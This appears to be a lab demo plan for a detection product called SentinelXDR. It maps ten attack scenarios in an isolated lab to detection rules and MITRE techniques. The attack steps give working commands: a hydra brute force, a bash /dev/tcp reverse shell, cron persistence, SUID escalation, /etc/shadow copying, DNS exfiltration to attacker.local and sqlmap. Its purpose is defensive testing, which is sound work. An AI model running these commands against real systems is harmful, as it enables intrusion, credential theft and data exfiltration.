# SentinelXDR — Lab Demo Plan

**Version:** 0.1.0 (Phase 0)
**Status:** Draft
**Last Updated:** 2026-06-09

---

## 1. Lab Environment Overview

The SentinelXDR lab is a fully isolated, locally-hosted environment designed to demonstrate real attack detection in a safe and repeatable way. It uses a Kali Linux VM as the attacker and a controlled victim container (Ubuntu) running a SentinelXDR agent.

All attacks are executed **exclusively within the lab network**. No external systems are affected. All attack tools reside only on the Kali VM.

---

## 2. Lab Network Topology

```
┌─────────────────────────────────────────────────────────────────┐
│                  LAB_NET (Docker isolated network)               │
│                  Subnet: 172.30.0.0/24                           │
│                  No internet gateway                             │
│                                                                  │
│  ┌─────────────────────────┐    ┌────────────────────────────┐  │
│  │   Kali Linux VM         │    │   Victim Container         │  │
│  │   (Attacker)            │    │   (Ubuntu 22.04)           │  │
│  │   IP: 172.30.0.10       │◄──►│   IP: 172.30.0.20          │  │
│  │                         │    │                            │  │
│  │   Tools:                │    │   Services:                │  │
│  │   • nmap                │    │   • SSH (port 22)          │  │
│  │   • hydra               │    │   • Apache (port 80)       │  │
│  │   • metasploit          │    │   • DVWA (port 8080)       │  │
│  │   • netcat              │    │   • SentinelXDR Agent      │  │
│  │   • impacket            │    │                            │  │
│  └─────────────────────────┘    └──────────────┬─────────────┘  │
└──────────────────────────────────────────────── │ ──────────────┘
                                                   │
                                    Agent events (HTTPS)
                                                   │
                                                   ▼
                              ┌────────────────────────────────┐
                              │  SentinelXDR Backend (host)    │
                              │  IP: 172.30.0.1 (gateway)      │
                              │  Port: 8000 (ingestion API)    │
                              └────────────────────────────────┘
```

---

## 3. Lab Infrastructure Components

| Component | Technology | IP | Purpose |
|---|---|---|---|
| Kali Attacker VM | Kali Linux (Docker or VirtualBox) | 172.30.0.10 | Execute attack scenarios |
| Victim Container | Ubuntu 22.04 (Docker) | 172.30.0.20 | Target of attacks; runs SentinelXDR agent |
| DVWA | Docker image (vulnerables/web-dvwa) | 172.30.0.20:8080 | Vulnerable web app for web attack scenarios |
| SentinelXDR Backend | Docker Compose (host) | 172.30.0.1 | Receives events, runs detection, serves UI |

---

## 4. Setup & Reset Procedure

### 4.1 Initial Setup

```bash
# 1. Create isolated lab network
docker network create --subnet=172.30.0.0/24 --opt com.docker.network.bridge.enable_ip_masquerade=false lab_net

# 2. Start SentinelXDR backend (from project root)
docker compose up -d

# 3. Start victim container
docker compose -f lab/docker-compose.victim.yml up -d

# 4. Start Kali container (or boot Kali VM)
docker compose -f lab/docker-compose.kali.yml up -d

# 5. Verify connectivity
docker exec -it kali ping 172.30.0.20   # Kali → Victim: should succeed
docker exec -it victim ping 8.8.8.8      # Victim → Internet: should fail (isolated)
```

### 4.2 Pre-Scenario Reset

Before each scenario, reset victim to clean state:

```bash
# Restart victim container from clean image
docker compose -f lab/docker-compose.victim.yml restart victim

# Clear previous lab alerts from platform (optional)
curl -X DELETE http://localhost:8000/api/v1/lab/alerts -H "Authorization: Bearer <admin_token>"
```

### 4.3 Kali VM Snapshot

If using a VM (not Docker), revert Kali to a pre-attack snapshot before each demo session to ensure clean tool state.

---

## 5. Detection Scenarios

Each scenario is described with: **attack steps**, **expected events generated**, **expected detection rule triggered**, and **MITRE ATT&CK mapping**.

---

### Scenario 01 — Network Reconnaissance (Port Scan)

**Category:** Network Detection
**Severity:** Medium
**MITRE:** T1046 — Network Service Discovery

**Attack Steps (from Kali):**
```bash
nmap -sS -p 1-1000 172.30.0.20
```

**Expected Agent Events:**
- High volume of `network_connection` events from 172.30.0.10 to victim on multiple ports

**Expected Detection:**
- Rule: `Port Scan Detection — High Connection Rate`
- Trigger condition: >100 distinct destination ports from single source IP within 60 seconds

**Expected Alert:**
- Title: "Port Scan Detected"
- Severity: Medium
- MITRE: TA0007 / T1046

---

### Scenario 02 — SSH Brute Force

**Category:** Identity / Credential Attack
**Severity:** High
**MITRE:** T1110.001 — Brute Force: Password Guessing

**Attack Steps (from Kali):**
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt 172.30.0.20 ssh -t 4
```

**Expected Agent Events:**
- Multiple `user_login` events with `success: false` from same source IP

**Expected Detection:**
- Rule: `SSH Brute Force — Multiple Failed Logins`
- Trigger condition: ≥10 failed SSH login attempts within 60 seconds from same source IP

**Expected Alert:**
- Title: "SSH Brute Force Attempt Detected"
- Severity: High
- MITRE: TA0006 / T1110.001

---

### Scenario 03 — Successful SSH Login After Brute Force

**Category:** Identity / Initial Access
**Severity:** Critical
**MITRE:** T1078 — Valid Accounts

**Attack Steps (from Kali):**
```bash
# After finding valid credentials via Scenario 02
ssh root@172.30.0.20
```

**Expected Agent Events:**
- `user_login` event with `success: true`, preceded by failed attempts

**Expected Detection:**
- Rule: `Successful Login Following Multiple Failures`
- Trigger condition: Successful login event within 5 minutes of ≥5 failed attempts from same IP

**Expected Alert:**
- Title: "Successful Login After Multiple Failures"
- Severity: Critical
- MITRE: TA0001 / T1078

---

### Scenario 04 — Reverse Shell (C2 Channel)

**Category:** Endpoint / Command and Control
**Severity:** Critical
**MITRE:** T1059.004 — Command and Scripting Interpreter: Unix Shell

**Attack Steps (from Kali):**
```bash
# On Kali: start listener
nc -lvnp 4444

# On Victim (simulating code execution): trigger reverse shell
bash -i >& /dev/tcp/172.30.0.10/4444 0>&1
```

**Expected Agent Events:**
- `process_create`: bash with suspicious `>& /dev/tcp/...` command line
- `network_connection`: outbound TCP from bash process to 172.30.0.10:4444

**Expected Detection:**
- Rule: `Reverse Shell via Bash`
- Trigger condition: process_create with bash command containing `/dev/tcp` AND outbound connection to non-standard port

**Expected Alert:**
- Title: "Reverse Shell Detected"
- Severity: Critical
- MITRE: TA0011 / T1059.004

---

### Scenario 05 — Privilege Escalation (SUID Abuse)

**Category:** Endpoint / Privilege Escalation
**Severity:** High
**MITRE:** T1548.001 — Abuse Elevation Control Mechanism: SUID and GUID

**Attack Steps (after shell access on victim):**
```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Exploit SUID binary (e.g., find with exec)
find . -exec /bin/sh \; -quit
whoami  # Expected: root
```

**Expected Agent Events:**
- `process_create`: `find` with `-exec /bin/sh` arguments
- `process_create`: shell spawned by SUID binary with elevated UID

**Expected Detection:**
- Rule: `SUID Binary Privilege Escalation`
- Trigger condition: process spawned by SUID binary, resulting UID = 0 while parent UID ≠ 0

**Expected Alert:**
- Title: "SUID Privilege Escalation Detected"
- Severity: High
- MITRE: TA0004 / T1548.001

---

### Scenario 06 — Cron Persistence

**Category:** Endpoint / Persistence
**Severity:** High
**MITRE:** T1053.003 — Scheduled Task/Job: Cron

**Attack Steps (after shell access on victim):**
```bash
echo "* * * * * bash -i >& /dev/tcp/172.30.0.10/5555 0>&1" >> /etc/crontab
```

**Expected Agent Events:**
- `file_modify`: `/etc/crontab` modified by non-administrative process

**Expected Detection:**
- Rule: `Cron Job Persistence — System Crontab Modified`
- Trigger condition: write operation to `/etc/crontab` or `/etc/cron.d/*` by non-root service process

**Expected Alert:**
- Title: "Cron Persistence Mechanism Detected"
- Severity: High
- MITRE: TA0003 / T1053.003

---

### Scenario 07 — Credential Dumping (/etc/shadow)

**Category:** Endpoint / Credential Access
**Severity:** Critical
**MITRE:** T1003.008 — OS Credential Dumping: /etc/passwd and /etc/shadow

**Attack Steps (after root access on victim):**
```bash
cat /etc/shadow
cp /etc/shadow /tmp/shadow.bak
```

**Expected Agent Events:**
- `file_create`: `/tmp/shadow.bak` (sensitive file copy)
- `process_create`: `cat /etc/shadow`

**Expected Detection:**
- Rule: `Shadow File Access — Credential Theft Indicator`
- Trigger condition: read or copy of `/etc/shadow` by non-system process

**Expected Alert:**
- Title: "Credential File Access Detected (/etc/shadow)"
- Severity: Critical
- MITRE: TA0006 / T1003.008

---

### Scenario 08 — Data Exfiltration via DNS Tunneling (Simulated)

**Category:** Data Leakage / Exfiltration
**Severity:** High
**MITRE:** T1048.003 — Exfiltration Over Alternative Protocol: DNS

**Attack Steps (from victim, simulated):**
```bash
# Simulate DNS exfiltration by encoding data in DNS queries
for chunk in $(base64 /etc/passwd | fold -w 30); do
  dig "$chunk.exfil.attacker.local" @172.30.0.10
done
```

**Expected Agent Events:**
- High volume of `network_dns` events with unusual query patterns (base64-like subdomains)

**Expected Detection:**
- Rule: `DNS Tunneling — High Volume Unusual Query Subdomains`
- Trigger condition: >20 DNS queries with subdomain length >20 chars within 30 seconds from single process

**Expected Alert:**
- Title: "Possible DNS Exfiltration Detected"
- Severity: High
- MITRE: TA0010 / T1048.003

---

### Scenario 09 — Web Attack: SQL Injection (DVWA)

**Category:** Web Detection
**Severity:** High
**MITRE:** T1190 — Exploit Public-Facing Application

**Attack Steps (from Kali against DVWA on victim):**
```bash
sqlmap -u "http://172.30.0.20:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=...; security=low"
```

**Expected Agent Events:**
- `network_connection`: multiple HTTP requests with SQL injection payloads in URI (captured via web server access log parsing or WAF events)

**Expected Detection:**
- Rule: `SQL Injection Attempt — OWASP Pattern Match`
- Trigger condition: HTTP request containing SQL injection patterns (UNION SELECT, OR 1=1, etc.) in URL or body

**Expected Alert:**
- Title: "SQL Injection Attempt Detected"
- Severity: High
- MITRE: TA0001 / T1190

---

### Scenario 10 — Lateral Movement (Horizontal Scan + Connection)

**Category:** Network / Lateral Movement
**Severity:** Critical
**MITRE:** T1021.004 — Remote Services: SSH

**Attack Steps (from compromised victim to another container, if multi-host lab is configured):**
```bash
# Scan internal network for other SSH targets
nmap -sS -p 22 172.30.0.0/24

# Connect to discovered host
ssh user@172.30.0.30
```

**Expected Agent Events:**
- `network_connection` events to multiple IPs on port 22 (scan)
- `process_create`: ssh client connecting to internal host

**Expected Detection:**
- Rule: `Internal Lateral Movement — SSH Scan Followed by Connection`
- Trigger condition: Port scan of internal /24 followed by successful SSH connection within 2 minutes

**Expected Alert:**
- Title: "Lateral Movement via SSH Detected"
- Severity: Critical
- MITRE: TA0008 / T1021.004

---

## 6. Detection Coverage Matrix

| # | Scenario | Domain | Severity | MITRE Tactic | MITRE Technique |
|---|---|---|---|---|---|
| 01 | Port Scan | Network | Medium | Discovery | T1046 |
| 02 | SSH Brute Force | Identity | High | Credential Access | T1110.001 |
| 03 | Successful Login After Brute Force | Identity | Critical | Initial Access | T1078 |
| 04 | Reverse Shell | Endpoint/C2 | Critical | Execution / C2 | T1059.004 |
| 05 | SUID Privilege Escalation | Endpoint | High | Privilege Escalation | T1548.001 |
| 06 | Cron Persistence | Endpoint | High | Persistence | T1053.003 |
| 07 | Credential Dumping | Endpoint | Critical | Credential Access | T1003.008 |
| 08 | DNS Tunneling | Data Leakage | High | Exfiltration | T1048.003 |
| 09 | SQL Injection | Web | High | Initial Access | T1190 |
| 10 | Lateral Movement (SSH) | Network | Critical | Lateral Movement | T1021.004 |

**MITRE ATT&CK Tactics Covered:** Initial Access, Execution, Persistence, Privilege Escalation, Credential Access, Discovery, Lateral Movement, Command and Control, Exfiltration

---

## 7. Demo Script — Full Attack Chain

The following sequence demonstrates a complete attack chain for a live demo, triggering multiple correlated alerts that should be grouped into a single incident.

```
Step 1:  Reconnaissance     → nmap scan of 172.30.0.20           (Scenario 01)
Step 2:  Credential Attack  → SSH brute force                    (Scenario 02)
Step 3:  Initial Access     → SSH login with cracked credentials  (Scenario 03)
Step 4:  Command Shell      → Spawn reverse shell                 (Scenario 04)
Step 5:  Escalation         → SUID exploitation                   (Scenario 05)
Step 6:  Credential Theft   → Read /etc/shadow                    (Scenario 07)
Step 7:  Persistence        → Add cron job                        (Scenario 06)
Step 8:  Exfiltration       → DNS tunneling of /etc/passwd        (Scenario 08)
```

**Expected platform response:**
- 8 individual alerts generated
- Correlation engine groups alerts into 1 incident: "Multi-Stage Attack — WORKSTATION-VICTIM"
- Attack timeline covers full kill chain from Reconnaissance to Exfiltration
- MITRE ATT&CK heatmap lights up 6+ tactics

**Demo duration:** ~15 minutes for full chain execution + 5 minutes dashboard walkthrough

---

## 8. Acceptance Criteria

For Phase 1 demo sign-off, all of the following must be true:

- [ ] All 10 scenarios execute cleanly from Kali VM without errors
- [ ] All 10 scenarios produce at least one alert in the SentinelXDR dashboard
- [ ] Alert appears within 5 seconds of attack execution
- [ ] All alerts correctly tagged with MITRE tactic and technique
- [ ] Full attack chain (Step 1–8) produces a correlated incident
- [ ] Process tree renders correctly for process-based scenarios (04, 05, 07)
- [ ] Network graph renders for network scenarios (01, 02, 10)
- [ ] Zero false negatives on lab scenarios with default rule configuration
- [ ] Victim container reset procedure takes < 60 seconds
- [ ] Platform reset + full demo reproducible end-to-end with no manual steps beyond `docker compose up`

---

*This document is the authoritative lab demo plan for SentinelXDR Phase 0/1.*
